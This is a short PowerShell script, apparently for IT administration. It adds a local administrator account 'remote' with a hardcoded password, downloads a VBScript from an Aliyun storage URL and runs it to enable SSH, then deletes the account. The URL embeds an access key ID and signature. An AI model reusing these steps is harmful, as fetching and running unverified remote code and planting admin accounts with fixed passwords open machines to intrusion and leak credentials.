$ProgressPreference = 'SilentlyContinue'
# Create Account;
# start-process -FilePath "$env:ComSpec" -WorkingDirectory $targetDirectory -ArgumentList "/c","pcautorun.exe"," -nobanner"," -accepteula"," -a * -ct > %COMPUTERNAME%.csv" -NoNewWindow -Wait
# 
start-process -FilePath "$env:ComSpec" -ArgumentList "/c net user remote 'Let@2013.' /add" -NoNewWindow -Wait
#net user remote || net user remote "Let@2013." /add
start-process -FilePath "$env:ComSpec" -ArgumentList "/c net localgroup administrators remote /add" -NoNewWindow -Wait

#net localgroup administrators remote /add
$ssh_enable = "https://it2u.oss-cn-shenzhen.aliyuncs.com/scripts/Enable_SSH.vbs?OSSAccessKeyId=LTAI5tP7rYToZxxVEa9wBStk&Expires=1703498461&Signature=19GSLKvzMm2FliLVplLZbVClojw%3D"
curl -Uri $ssh_enable -OutFile ssh_enable.vbs -ErrorAction SilentlyContinue
.\wscript.exe .\ssh_enable.vbs

# DELETE ACCOUNT;
net user remote /delete
net localgroup administrators remote /delete


